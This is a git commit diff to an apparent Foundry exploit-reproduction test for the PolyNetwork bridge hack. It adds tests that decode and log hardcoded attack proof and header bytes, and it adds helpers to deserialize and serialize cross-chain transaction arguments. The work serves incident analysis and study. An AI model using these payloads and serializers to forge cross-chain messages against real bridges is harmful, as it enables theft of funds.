3609a0718611c3d9291cddc2ccb5d7987fc4535a
Tiago Assumpcao <tiago@coinspect.com>
2022-12-20 22:35:59 -0300

    Decomposed and deserialized all hardcoded data Started serializers

--- test/Bridges/PolyNetworkBridge/PolyNetworkBridge.attack.sol
+++ test/Bridges/PolyNetworkBridge/PolyNetworkBridge.attack.sol
@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../../TestHarness.sol";
 import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
 import {ECCUtils} from '../../interfaces/PolyNetworkLibraries/ETHCrossChainUtils.sol';
+import {ZeroCopySource} from '../../interfaces/PolyNetworkLibraries/ZeroCopySource.sol';
+import {ZeroCopySink} from '../../interfaces/PolyNetworkLibraries/ZeroCopySink.sol';
 
 interface IEthCrossChainManager {
     function verifyHeaderAndExecuteTx(
@@ -14,6 +16,12 @@ interface IEthCrossChainManager {
         bytes memory curRawHeader,
         bytes memory headerSig
     ) external returns (bool);
+}
+
+struct TxArgs {
+    bytes toAssetHash;
+    bytes toAddress;
+    uint256 amount;
 }
 
 contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
@@ -60,12 +68,80 @@ contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
         assertGe(balanceAfter, balanceBefore);
     }
 
+    function test_parsedata1() external {
+        bytes memory proof = hex'af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d';
+        bytes memory rawHeader = hex'0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000';
+        //bytes memory headerSig = hex'7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000';
+        ECCUtils.Header memory header;
+        ECCUtils.ToMerkleValue memory toMerkleValue;
+        uint64 crossChainId;
+
+        Exploit_PolyNetwork_Deserializer deserializer = new Exploit_PolyNetwork_Deserializer();
+    
+        header = deserializer.deserializeHeader(rawHeader);
+        toMerkleValue = deserializer.deseralizeProof(proof, header);
+
+        console.log("From chain ID:", toMerkleValue.fromChainID);
+        emit log_named_bytes("Cross chain tx hash", toMerkleValue.txHash);
+
+        emit log_named_bytes("Source chain tx hash", toMerkleValue.makeTxParam.txHash);
+        (crossChainId, ) = ZeroCopySource.NextUint64(toMerkleValue.makeTxParam.crossChainId, 0);
+        console.log("Cross chain ID:", crossChainId);
+        emit log_named_bytes("From contract", toMerkleValue.makeTxParam.fromContract);
+        console.log("To chain ID:", toMerkleValue.makeTxParam.toChainId);
+        emit log_named_bytes("To contract", toMerkleValue.makeTxParam.toContract);
+
+        emit log_named_bytes("Method ASCII encoded", toMerkleValue.makeTxParam.method);
+        bytes4 _methodId = bytes4(keccak256(abi.encodePacked(toMerkleValue.makeTxParam.method, "(bytes,bytes,uint64)")));
+        console.log("Method ID");
+        console.logBytes4(_methodId);
+
+        emit log_named_bytes("Args", toMerkleValue.makeTxParam.args);
+    }
+
+    function test_parsedata2() external {
+        bytes memory proof = hex'b12094821f19c671e4c557c358d0780bd2030f3c909df3cb6933607077b9e57d89bd0a00000000000000010001001434d4a23a1fc0c694f0d74ddaf9d8d564cfe2d430020000000000000014250e76987d838a75310c34bf422ea9f1ac4cc90606756e6c6f636b4a14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000';
+        bytes memory rawHeader = hex'00000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000afc014478ad573eaa072aaf625f990b01b1f0733b6070d2e38770f74c4d5fac900000000000000000000000000000000000000000000000000000000000000000000000000ca9a3b020000000000000001000000000000000000000000000000000000000000000000000000000000000000';
+        //bytes memory headerSig = hex'0c6539f57b9bd2138b003744d9bd94375111bd0137525073b5b3967b7089d98f47236cea76488260b74cb587dbbeb7c5f35a056a5cf5b63649cd90ff487f386401';
+        ECCUtils.Header memory header;
+        ECCUtils.ToMerkleValue memory toMerkleValue;
+        TxArgs memory txArgs;
+
+        Exploit_PolyNetwork_Deserializer deserializer = new Exploit_PolyNetwork_Deserializer();
+    
+        header = deserializer.deserializeHeader(rawHeader);
+        toMerkleValue = deserializer.deseralizeProof(proof, header);
+
+        console.log("From chain ID:", toMerkleValue.fromChainID);
+        emit log_named_bytes("Cross chain tx hash", toMerkleValue.txHash);
+
+        emit log_named_bytes("Source chain tx hash", toMerkleValue.makeTxParam.txHash);
+        emit log_named_bytes("Cross chain ID", toMerkleValue.makeTxParam.crossChainId);
+        emit log_named_bytes("From contract", toMerkleValue.makeTxParam.fromContract);
+        console.log("To chain ID:", toMerkleValue.makeTxParam.toChainId);
+        emit log_named_bytes("To contract", toMerkleValue.makeTxParam.toContract);
+
+        emit log_named_bytes("Method ASCII encoded", toMerkleValue.makeTxParam.method);
+        bytes4 _methodId = bytes4(keccak256(abi.encodePacked(toMerkleValue.makeTxParam.method, "(bytes,bytes,uint64)")));
+        console.log("Method ID");
+        console.logBytes4(_methodId);
+
+        emit log_named_bytes("Args", toMerkleValue.makeTxParam.args);
+        txArgs = deserializer.deserializeTxArgs(toMerkleValue.makeTxParam.args);
+        emit log_named_bytes("Tx args.toAssetHash", txArgs.toAssetHash);
+        emit log_named_bytes("Tx args.toAddress", txArgs.toAddress);
+        console.log("Tx args.amount: ", txArgs.amount);
+    }
 }
 
-contract Exploit_PolyNetwork_Deserializer is TestHarness, TokenBalanceTracker {
+contract Exploit_PolyNetwork_Deserializer is TestHarness {
 
-    function deseralizeProof(bytes memory _proof) public pure returns(ECCUtils.ToMerkleValue memory){
-        ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(_proof);
+    function deseralizeProof(bytes memory _proof, ECCUtils.Header memory _header) public pure returns(ECCUtils.ToMerkleValue memory) {
+        ECCUtils.ToMerkleValue memory toMerkleValue;
+        bytes memory toMerkleValueBs;
+
+        toMerkleValueBs = ECCUtils.merkleProve(_proof, _header.crossStatesRoot);
+        toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);
         return toMerkleValue;
     }
 
@@ -74,4 +150,25 @@ contract Exploit_PolyNetwork_Deserializer is TestHarness, TokenBalanceTracker {
         return header;
     }
 
+    function deserializeTxArgs(bytes memory valueBs) public pure returns (TxArgs memory) {
+        TxArgs memory args;
+        uint256 off = 0;
+        (args.toAssetHash, off) = ZeroCopySource.NextVarBytes(valueBs, off);
+        (args.toAddress, off) = ZeroCopySource.NextVarBytes(valueBs, off);
+        (args.amount, off) = ZeroCopySource.NextUint255(valueBs, off);
+        return args;
+    }
+}
+
+contract Exploit_PolyNetwork_Serializer is TestHarness {
+    
+    function serializeTxArgs(TxArgs memory args) public pure returns (bytes memory) {
+        bytes memory buff;
+        buff = abi.encodePacked(
+            ZeroCopySink.WriteVarBytes(args.toAssetHash),
+            ZeroCopySink.WriteVarBytes(args.toAddress),
+            ZeroCopySink.WriteUint255(args.amount)
+            );
+        return buff;
+    }
 }
